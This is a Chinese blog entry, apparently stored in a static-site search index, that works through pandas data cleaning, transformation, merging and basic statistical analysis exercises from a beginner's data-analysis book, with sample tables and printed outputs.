<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[谁说菜鸟不会数据分析（python篇）]]></title>
    <url>%2F2019%2F09%2F24%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%2F%E8%B0%81%E8%AF%B4%E8%8F%9C%E9%B8%9F%E4%B8%8D%E4%BC%9A%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90(python%E7%AF%87)%2F</url>
    <content type="text"><![CDATA[前言实现 《谁说菜鸟不会数据分析》 代码 数据处理数据清洗数据排序按照一定顺序排序，以便研究者通过浏览数据发现一些明显的特征、规律或趋势，找到解决问题的线索。有助于对数据检查纠错，以及为重新归类或分组等提供方便 1import pandas as pd 12data = pd.read_csv('../data/cnbook/第四章/4.2.1 数据排序/数据排序.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 性别 年龄 0 100000 男 52 1 100001 男 23 2 100002 男 30 3 100006 男 28 4 100010 男 28 12345# 根据年龄升序、性别降序data.sort_values( ['年龄', '性别'], ascending = [True, False]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 性别 年龄 6 100012 男 21 1 100001 男 23 7 100013 男 24 9 100016 男 26 5 100011 男 27 3 100006 男 28 4 100010 男 28 2 100002 男 30 10 100017 女 30 8 100015 男 33 0 100000 男 52 重复数据处理重复数据查找12data = pd.read_csv('../data/cnbook/第四章/4.2.2 重复数据处理/重复值.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 性别 0 1 刘一 男 1 1 刘一 男 2 3 张三 男 3 4 李四 女 4 5 王五 女 5 6 赵六 男 6 7 孙七 女 7 8 周八 女 8 9 吴九 男 9 10 郑十 男 12# 查找行重复的data.duplicated() 0 False 1 True 2 False 3 False 4 False 5 False 6 False 7 False 8 False 9 False dtype: bool 12# 根据 性别 列，找出重复的位置data.duplicated(['性别']) 0 False 1 True 2 True 3 False 4 True 5 True 6 True 7 True 8 True 9 True dtype: bool 重复数据删除1data.drop_duplicates() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 性别 0 1 刘一 男 2 3 张三 男 3 4 李四 女 4 5 王五 女 5 6 赵六 男 6 7 孙七 女 7 8 周八 女 8 9 吴九 男 9 10 郑十 男 缺失数据处理处理方法： 填充，用平均值等方法进行填充 删除有缺失值的行，如果数据量较小不适合 不处理 数据补齐12data = pd.read_csv('../data/cnbook/第四章/4.2.3 缺失值处理/常见缺失值.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256.0 1 2 陈二 NaN 2 3 张三 282.0 3 4 李四 245.0 4 5 王五 162.0 5 6 赵六 295.0 6 7 孙七 173.0 7 8 周八 197.0 8 9 吴九 236.0 9 10 郑十 311.0 12# 使用平均值填充data.fillna(data['消费'].mean()) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256.000000 1 2 陈二 239.666667 2 3 张三 282.000000 3 4 李四 245.000000 4 5 王五 162.000000 5 6 赵六 295.000000 6 7 孙七 173.000000 7 8 周八 197.000000 8 9 吴九 236.000000 9 10 郑十 311.000000 删除缺失值1data.dropna() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256.0 2 3 张三 282.0 3 4 李四 245.0 4 5 王五 162.0 5 6 赵六 295.0 6 7 孙七 173.0 7 8 周八 197.0 8 9 吴九 236.0 9 10 郑十 311.0 空格数据处理空格数据是指字符串型数据的前面或后面存在空格 12data = pd.read_csv('../data/cnbook/第四章/4.2.4 空格值处理/空格值.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id name 0 1 KEN 1 2 JIMI 2 3 John 1data.name.str.strip() 0 KEN 1 JIMI 2 John Name: name, dtype: object 数据转换数值转字符串12data = pd.read_csv('../data/cnbook/第四章/4.3.1 数值转字符/数值转字符.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 电话号码 0 1 刘一 256.1 166547114238 1 2 陈二 239.5 166423353436 2 3 张三 282.6 166556915853 3 4 李四 245.8 166434728749 4 5 王五 162.3 166544742252 5 6 赵六 295.3 166827395761 6 7 孙七 173.6 166917847616 7 8 周八 197.9 166528757061 8 9 吴九 236.2 166809774605 9 10 郑十 311.1 166434676621 12# 查看类型data.dtypes ID int64 姓名 object 消费 float64 电话号码 int64 dtype: object 1data['电话号码'].dtype dtype(&apos;int64&apos;) 123# 把 电话号码 列转换为字符型data['电话号码'] = data['电话号码'].astype(str)data['电话号码'].dtype dtype(&apos;O&apos;) 字符串转数值12data['电话号码'] = data['电话号码'].astype(float)data['电话号码'].dtype dtype(&apos;float64&apos;) 字符串转时间时间转换12data = pd.read_csv('../data/cnbook/第四章/4.3.3 字符转时间/字符转时间.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 0 166412894295 2011/1/1 否 1 135416795207 2012/2/3 否 2 177423353436 2013/3/2 是 3 189424978309 2014/4/11 是 4 134450811715 2015/5/18 否 5 137450811771 2016/6/12 否 6 173450811789 2017/7/15 是 7 188450811792 2018/8/17 是 8 168450811840 2019/9/16 是 1data['注册时间'].dtype dtype(&apos;O&apos;) 12345data['时间'] = pd.to_datetime( data.注册时间, format='%Y/%m/%d')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 0 166412894295 2011/1/1 否 2011-01-01 1 135416795207 2012/2/3 否 2012-02-03 2 177423353436 2013/3/2 是 2013-03-02 3 189424978309 2014/4/11 是 2014-04-11 4 134450811715 2015/5/18 否 2015-05-18 1data.时间.dtype dtype(&apos;&lt;M8[ns]&apos;) 时间格式化12data['年月'] = data.时间.dt.strftime('%Y-%m')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 年月 0 166412894295 2011/1/1 否 2011-01-01 2011-01 1 135416795207 2012/2/3 否 2012-02-03 2012-02 2 177423353436 2013/3/2 是 2013-03-02 2013-03 3 189424978309 2014/4/11 是 2014-04-11 2014-04 4 134450811715 2015/5/18 否 2015-05-18 2015-05 数据抽取字段分拆按照位置分拆12data = pd.read_csv('../data/cnbook/第四章/4.4.1 字段拆分/字段拆分.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel 0 18922254812 1 13522255003 2 13422259938 3 18822256753 4 18922253721 5 13422259313 6 13822254373 7 13322252452 8 18922257681 123# 电话转换成字符串格式data['tel'] = data['tel'].astype(str)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel 0 18922254812 1 13522255003 2 13422259938 3 18822256753 4 18922253721 1234567# 运营商data['bands'] = data['tel'].str.slice(0, 3)# 地区data['areas'] = data['tel'].str.slice(3, 7)# 号码段data['nums'] = data['tel'].str.slice(7, 11)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel bands areas nums 0 18922254812 189 2225 4812 1 13522255003 135 2225 5003 2 13422259938 134 2225 9938 3 18822256753 188 2225 6753 4 18922253721 189 2225 3721 按照分隔符拆分12data = pd.read_csv('../data/cnbook/第四章/4.4.1 字段拆分/分隔符.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name 0 Apple iPad mini 1 华为 MediaPad 7Vogue 2 昂达（ONDA） V975四核 3 华为（HUAWEI） 荣耀X1 4 酷比魔方（CUBE） TALK7X四核 5 惠普（HP） Slate 7 6 酷比魔方（ACUBE) TALK97 7 三星（SAMSUNG） GALAXY NotePro 1234# 按照 空格 分割，从 第一个 开始，使用 数据框 返回结果newData = data['name'].str.split(' ', 1, True)newData.columns = ['band', 'name']newData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } band name 0 Apple iPad mini 1 华为 MediaPad 7Vogue 2 昂达（ONDA） V975四核 3 华为（HUAWEI） 荣耀X1 4 酷比魔方（CUBE） TALK7X四核 时间属性抽取12data = pd.read_csv('../data/cnbook/第四章/4.4.1 字段拆分/时间属性.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 0 166412894295 2011/1/1 12:13:24 否 1 135416795207 2012/2/3 1:15:38 否 2 177423353436 2013/3/2 13:54:55 是 3 189424978309 2014/4/11 11:00:03 是 4 134450811715 2015/5/18 10:02:23 否 1234data['时间'] = pd.to_datetime( data.注册时间, format='%Y/%m/%d') 12data['时间.年'] = data['时间'].dt.yeardata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 时间.年 0 166412894295 2011/1/1 12:13:24 否 2011-01-01 12:13:24 2011 1 135416795207 2012/2/3 1:15:38 否 2012-02-03 01:15:38 2012 2 177423353436 2013/3/2 13:54:55 是 2013-03-02 13:54:55 2013 3 189424978309 2014/4/11 11:00:03 是 2014-04-11 11:00:03 2014 4 134450811715 2015/5/18 10:02:23 否 2015-05-18 10:02:23 2015 记录抽取12data = pd.read_csv('../data/cnbook/第四章/4.4.2 记录抽取/记录抽取.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 0 1197453 10071 华为（HUAWEI） 荣耀平板 2015-05-26 1 1192330 16879 Apple iPad平板 2012-01-26 2 1225995 2218 小米（MI）7.9英寸平板 2013-06-16 3 1308557 12605 Apple IPad mini平板 2013-05-26 4 1185287 11836 微软（Microsoft） Surface Pro 3 2016-08-21 关键词抽取12fdata = data[data.title.str.contains('台电', na=False)]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 7 1150612 5857 台电（Teclast） P98 2015-05-14 8 1285329 2482 台电（Teclast）X98 Air 2015-08-21 空值抽取12fdata = data[data.title.isnull()]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 5 1197789 2084 NaN 2015-03-03 数值范围抽取123# 单条件比较运算fdata = data[data['comments'] &gt; 10000]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 0 1197453 10071 华为（HUAWEI） 荣耀平板 2015-05-26 1 1192330 16879 Apple iPad平板 2012-01-26 3 1308557 12605 Apple IPad mini平板 2013-05-26 4 1185287 11836 微软（Microsoft） Surface Pro 3 2016-08-21 6 996957 11123 Apple iPad Air 2015-02-10 123# 之间fdata = data[data['comments'].between(1000, 10000)]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 2 1225995 2218 小米（MI）7.9英寸平板 2013-06-16 5 1197789 2084 NaN 2015-03-03 7 1150612 5857 台电（Teclast） P98 2015-05-14 8 1285329 2482 台电（Teclast）X98 Air 2015-08-21 组合条件抽取123# 多条件fdata = data[(data['comments'] &gt; 1000) &amp; (data['comments'] &lt; 10000)]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 2 1225995 2218 小米（MI）7.9英寸平板 2013-06-16 5 1197789 2084 NaN 2015-03-03 7 1150612 5857 台电（Teclast） P98 2015-05-14 8 1285329 2482 台电（Teclast）X98 Air 2015-08-21 时间范围抽取1data.ptime.dtype dtype(&apos;O&apos;) 1data.ptime = pd.to_datetime(data.ptime) 1234567891011121314from datetime import datetime# 定义时间dt1 = datetime( year = 2015, month = 1, day = 1)dt2 = datetime( year = 2015, month = 12, day = 1)fdata = data[(data.ptime &gt;= dt1) &amp; (data.ptime &lt;= dt2)]fdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title ptime 0 1197453 10071 华为（HUAWEI） 荣耀平板 2015-05-26 5 1197789 2084 NaN 2015-03-03 6 996957 11123 Apple iPad Air 2015-02-10 7 1150612 5857 台电（Teclast） P98 2015-05-14 8 1285329 2482 台电（Teclast）X98 Air 2015-08-21 随机抽样按个数抽样12data = pd.read_csv('../data/cnbook/第四章/4.4.3 随机抽样/随机抽样.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256 1 2 陈二 239 2 3 张三 282 3 4 李四 245 4 5 王五 162 12sdata = data.sample(n=3)sdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256 6 7 孙七 173 1 2 陈二 239 按照百分比抽样12sdata = data.sample(frac=0.2)sdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 2 3 张三 282 1 2 陈二 239 是否放回抽样123# replace=True 为放回抽样sdata = data.sample(n=3, replace=True)sdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 7 8 周八 197 4 5 王五 162 1 2 陈二 239 数据合并记录合并12data1 = pd.read_csv('../data/cnbook/第四章/4.5.1 记录合并/台电.csv')data1.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title 0 1235465 3256 台电（Teclast）X98 Air Ⅱ 1 1312660 342 台电（Teclast）X10HD 3G 2 1192758 1725 台电（Teclast）P98 Air 3 1312671 279 台电（Teclast）X89 4 1094550 2563 台电（Teclast） P19HD 12data2 = pd.read_csv('../data/cnbook/第四章/4.5.1 记录合并/小米.csv')data2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title 0 1134006 13231 小米（MI） MIX 1 1192330 6879 小米（MI） MIX 2 2 1225995 2218 小米（MI） MAX 3 1225988 1336 小米（MI） MAX 2 4 1284247 578 小米（MI） 7 12data3 = pd.read_csv('../data/cnbook/第四章/4.5.1 记录合并/苹果.csv')data3.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title 0 996961 62014 Apple iPad Air 1 996967 59503 Apple iPad mini 2 1246836 8791 Apple iPhone 7 3 996964 9332 Apple iPhone X 4 1250967 4932 Apple iPad Air 2 1pd.concat([data1, data2, data3]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title 0 1235465 3256 台电（Teclast）X98 Air Ⅱ 1 1312660 342 台电（Teclast）X10HD 3G 2 1192758 1725 台电（Teclast）P98 Air 3 1312671 279 台电（Teclast）X89 4 1094550 2563 台电（Teclast） P19HD 5 1327452 207 台电（Teclast）P80 3G 0 1134006 13231 小米（MI） MIX 1 1192330 6879 小米（MI） MIX 2 2 1225995 2218 小米（MI） MAX 3 1225988 1336 小米（MI） MAX 2 4 1284247 578 小米（MI） 7 0 996961 62014 Apple iPad Air 1 996967 59503 Apple iPad mini 2 1246836 8791 Apple iPhone 7 3 996964 9332 Apple iPhone X 4 1250967 4932 Apple iPad Air 2 字段合并12data = pd.read_csv('../data/cnbook/第四章/4.5.2 字段合并/字段合并.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } band area num 0 189 2225 4812 1 135 2225 5003 2 134 2225 9938 3 188 2225 6753 4 189 2225 3721 12345# 用 + 号进行合并，因为如果是数值型的会进行计算，所以需要先转换成字符串型的data = data.astype(str)# 将 band、area、num 列合并为一个新的列data['tel'] = data['band'] + data['area'] + data['num']data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } band area num tel 0 189 2225 4812 18922254812 1 135 2225 5003 13522255003 2 134 2225 9938 13422259938 3 188 2225 6753 18822256753 4 189 2225 3721 18922253721 字段匹配12items = pd.read_csv('../data/cnbook/第四章/4.5.3 字段匹配/商品名称.csv')items.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title 0 996955 2412 Apple iPad Air 1 1251208 2061 Apple iPad Air 2 2 1197453 10071 华为（HUAWEI） 荣耀平板 3 1192330 6879 小米（MI） 平板 4 1225995 2218 小米（MI） MAX 2 12prices = pd.read_csv('../data/cnbook/第四章/4.5.3 字段匹配/商品价格.csv')prices.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id oldPrice nowPrice 0 996955 3099 4299 1 1251208 4288 4289 2 1197453 799 1000 3 1192330 1699 1799 4 1225995 1299 1599 1234567# 内链接 innerpd.merge( items, prices, left_on='id', right_on='id') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title oldPrice nowPrice 0 996955 2412 Apple iPad Air 3099 4299 1 1251208 2061 Apple iPad Air 2 4288 4289 2 1197453 10071 华为（HUAWEI） 荣耀平板 799 1000 3 1192330 6879 小米（MI） 平板 1699 1799 4 1225995 2218 小米（MI） MAX 2 1299 1599 5 1308557 1605 华为（HUAWEI） Mate 2 999 1099 6 1185287 836 微软（Microsoft） Surface Pro 3 7388 7588 7 1197789 2084 小米（MI） MAX 1 1299 1500 8 996957 11123 Apple iPad Air 2 2788 2899 9 1150612 5857 台电（Teclast） P98 999 1499 12345678# 左链接 leftpd.merge( items, prices, left_on='id', right_on='id', how='left') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title oldPrice nowPrice 0 996955 2412 Apple iPad Air 3099.0 4299 1 1251208 2061 Apple iPad Air 2 4288.0 4289 2 1197453 10071 华为（HUAWEI） 荣耀平板 799.0 1000 3 1192330 6879 小米（MI） 平板 1699.0 1799 4 1225995 2218 小米（MI） MAX 2 1299.0 1599 5 1308557 1605 华为（HUAWEI） Mate 2 999.0 1099 6 1185287 836 微软（Microsoft） Surface Pro 3 7388.0 7588 7 1197789 2084 小米（MI） MAX 1 1299.0 1500 8 996957 11123 Apple iPad Air 2 2788.0 2899 9 1150612 5857 台电（Teclast） P98 999.0 1499 10 0 0 左边才有的 NaN NaN 12345678# 右链接 rightpd.merge( items, prices, left_on='id', right_on='id', how='right') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title oldPrice nowPrice 0 996955 2412.0 Apple iPad Air 3099 4299 1 1251208 2061.0 Apple iPad Air 2 4288 4289 2 1197453 10071.0 华为（HUAWEI） 荣耀平板 799 1000 3 1192330 6879.0 小米（MI） 平板 1699 1799 4 1225995 2218.0 小米（MI） MAX 2 1299 1599 5 1308557 1605.0 华为（HUAWEI） Mate 2 999 1099 6 1185287 836.0 微软（Microsoft） Surface Pro 3 7388 7588 7 1197789 2084.0 小米（MI） MAX 1 1299 1500 8 996957 11123.0 Apple iPad Air 2 2788 2899 9 1150612 5857.0 台电（Teclast） P98 999 1499 10 1 NaN NaN 1 右边才有的 12345678# 外链接 outerpd.merge( items, prices, left_on='id', right_on='id', how='outer') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id comments title oldPrice nowPrice 0 996955 2412.0 Apple iPad Air 3099.0 4299 1 1251208 2061.0 Apple iPad Air 2 4288.0 4289 2 1197453 10071.0 华为（HUAWEI） 荣耀平板 799.0 1000 3 1192330 6879.0 小米（MI） 平板 1699.0 1799 4 1225995 2218.0 小米（MI） MAX 2 1299.0 1599 5 1308557 1605.0 华为（HUAWEI） Mate 2 999.0 1099 6 1185287 836.0 微软（Microsoft） Surface Pro 3 7388.0 7588 7 1197789 2084.0 小米（MI） MAX 1 1299.0 1500 8 996957 11123.0 Apple iPad Air 2 2788.0 2899 9 1150612 5857.0 台电（Teclast） P98 999.0 1499 10 0 0.0 左边才有的 NaN NaN 11 1 NaN NaN 1.0 右边才有的 数据计算简单计算12data = pd.read_csv('../data/cnbook/第四章/4.6.1 简单计算/单价数量.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name price num 0 A 6058 408 1 B 1322 653 2 C 7403 400 3 D 4911 487 4 E 3320 56 12data['total'] = data.price * data.numdata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name price num total 0 A 6058 408 2471664 1 B 1322 653 863266 2 C 7403 400 2961200 3 D 4911 487 2391657 4 E 3320 56 185920 时间计算12data = pd.read_csv('../data/cnbook/第四章/4.6.2 时间计算/时间计算.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 0 166412894295 2011/1/1 否 1 135416795207 2012/2/3 否 2 177423353436 2013/3/2 是 3 189424978309 2014/4/11 是 4 134450811715 2015/5/18 否 12345data['时间'] = pd.to_datetime( data.注册时间, format='%Y/%m/%d')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 0 166412894295 2011/1/1 否 2011-01-01 1 135416795207 2012/2/3 否 2012-02-03 2 177423353436 2013/3/2 是 2013-03-02 3 189424978309 2014/4/11 是 2014-04-11 4 134450811715 2015/5/18 否 2015-05-18 1234from datetime import datetime# 计算注册天数data['注册天数'] = datetime.now() - data.时间data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 注册天数 0 166412894295 2011/1/1 否 2011-01-01 3188 days 18:19:05.434942 1 135416795207 2012/2/3 否 2012-02-03 2790 days 18:19:05.434942 2 177423353436 2013/3/2 是 2013-03-02 2397 days 18:19:05.434942 3 189424978309 2014/4/11 是 2014-04-11 1992 days 18:19:05.434942 4 134450811715 2015/5/18 否 2015-05-18 1590 days 18:19:05.434942 12data['注册天数'] = data['注册天数'].dt.daysdata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 电话 注册时间 是否微信 时间 注册天数 0 166412894295 2011/1/1 否 2011-01-01 3188 1 135416795207 2012/2/3 否 2012-02-03 2790 2 177423353436 2013/3/2 是 2013-03-02 2397 3 189424978309 2014/4/11 是 2014-04-11 1992 4 134450811715 2015/5/18 否 2015-05-18 1590 数据标准化数据标准化是指对数据按照比例进行缩放，使之落入特定区域，数据标准化的作用就是消除单位量纲的影响，方便进行不同变量间的对比分析 0-1标准化：x’ = (x - min) / (max -min) 12data = pd.read_csv('../data/cnbook/第四章/4.6.3 数据标准化/标准化.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 0 1 刘一 256 1 2 陈二 239 2 3 张三 282 3 4 李四 245 4 5 王五 162 123# 实现 0-1 标准化data['消费标准化'] = (data['消费'] - data['消费'].min())/(data['消费'].max() - data['消费'].min())data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID 姓名 消费 消费标准化 0 1 刘一 256 0.630872 1 2 陈二 239 0.516779 2 3 张三 282 0.805369 3 4 李四 245 0.557047 4 5 王五 162 0.000000 数据分组12data = pd.read_csv('../data/cnbook/第四章/4.6.4 数据分组/数据分组.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel cost 0 166424556600 2.0 1 166424557199 5.0 2 166424561768 75.3 3 166424569696 20.0 4 166424569924 97.3 分组的数组12# 查看最大值最小值data.cost.min() 2.0 1data.cost.max() 100.0 1234# 定义分组bins = [0, 20, 40, 60, 80, 100]data['cut'] = pd.cut(data.cost, bins)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel cost cut 0 166424556600 2.0 (0, 20] 1 166424557199 5.0 (0, 20] 2 166424561768 75.3 (60, 80] 3 166424569696 20.0 (0, 20] 4 166424569924 97.3 (80, 100] 区间的闭合默认是使用 左开右闭 的right = True 表示 左开右闭right = False 表示 左闭右开 123bins = [0, 20, 40, 60, 80, 100, 120]data['cut'] = pd.cut(data.cost, bins, right=False)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel cost cut 0 166424556600 2.0 [0, 20) 1 166424557199 5.0 [0, 20) 2 166424561768 75.3 [60, 80) 3 166424569696 20.0 [20, 40) 4 166424569924 97.3 [80, 100) 自定义标签1234bins = [0, 20, 40, 60, 80, 100, 120]customLabels = ['0-20', '20-40', '40-60', '60-80', '80-100', '100-120']data['cut'] = pd.cut(data.cost, bins, right=False, labels=customLabels)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tel cost cut 0 166424556600 2.0 0-20 1 166424557199 5.0 0-20 2 166424561768 75.3 60-80 3 166424569696 20.0 20-40 4 166424569924 97.3 80-100 数据分析对比分析概念，无案例 基本统计分析描述性统计分析，主要包括数据的集中趋势分析、数据的离散程度分析、数据的频数分布分析等，常用的统计指标有：计数、求和、平均数、方差、标准差等 12data = pd.read_csv('../data/cnbook/第五章/5.2 基本统计分析/描述性统计分析.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id area sales 0 1 越秀区 1250 1 2 天河区 1253 2 3 番禺区 1280 3 4 南沙区 1260 4 5 增城区 1310 5 6 花都区 1190 6 7 海珠区 1288 7 8 黄埔区 1310 8 9 白云区 1220 9 10 从化市 1380 10 11 萝岗区 1256 11 12 荔湾区 1220 12# 描述性统计分析data.sales.describe() count 12.000000 mean 1268.083333 std 50.510950 min 1190.000000 25% 1242.500000 50% 1258.000000 75% 1293.500000 max 1380.000000 Name: sales, dtype: float64 获取百分位值 12# 获取 30% 分位数最近的值data.sales.quantile(0.3, interpolation='nearest') 1250 分组分析12data = pd.read_csv('../data/cnbook/第五章/5.3 分组分析/分组分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id reg_date id_num gender birthday age 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 3 100006 2011/1/1 37110219860824751B 男 1986/8/24 28 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 1234# 按照性别分组，对年龄求平均值data.groupby( by=['gender']).age.agg('mean') gender 女 30.392493 男 26.979629 Name: age, dtype: float64 12345# 分组不做索引data.groupby( by=['gender'], as_index=False).age.agg('mean') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } gender age 0 女 30.392493 1 男 26.979629 结构分析在分组的基础上，计算各组成部分所占的比重 12data = pd.read_csv('../data/cnbook/第五章/5.4 结构分析/结构分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id reg_date id_num gender birthday age 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 3 100006 2011/1/1 37110219860824751B 男 